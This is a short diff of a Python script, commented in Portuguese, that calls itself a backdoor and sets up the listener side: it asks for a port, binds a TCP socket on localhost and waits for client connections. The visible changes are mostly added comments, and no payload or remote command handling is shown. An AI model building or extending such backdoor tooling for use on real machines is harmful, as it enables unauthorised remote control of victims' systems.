@@ -1,11 +1,17 @@
+## Bibliotecas
 from socket import *
-from os import system
 from os.path import basename, exists, getsize
 from functions import *
 
+
+## Algumas informações sobre o backdoor
 INFO_BACKDOOR = {'version': '1.0.0', 'update_data': '28/10/2022'}
 
+
+## Limpa a tela, so pra deixar bunitin mesmo
 AdaptedFromSystem(Windows='cls', Linux='clear')
+
+
 ## Verifica a porta a abrir o backdoor
 while True:
     try:
@@ -21,14 +27,17 @@ while True:
             continue
         break
 
-ANDRESS = ('localhost', port)
+## Limpa a tela novamente.
 AdaptedFromSystem(Windows='cls', Linux='clear')
 
+## Cria o socket
+ANDRESS = ('localhost', port)
 socket = socket(AF_INET, SOCK_STREAM)
 socket.bind(ANDRESS)
 socket.listen()
 print("Aguardando alguma conexão...")
 
+## Sempre que receber uma conexão ele irá fazer esse processo
 while True:
     try:
         client, andress = socket.accept()
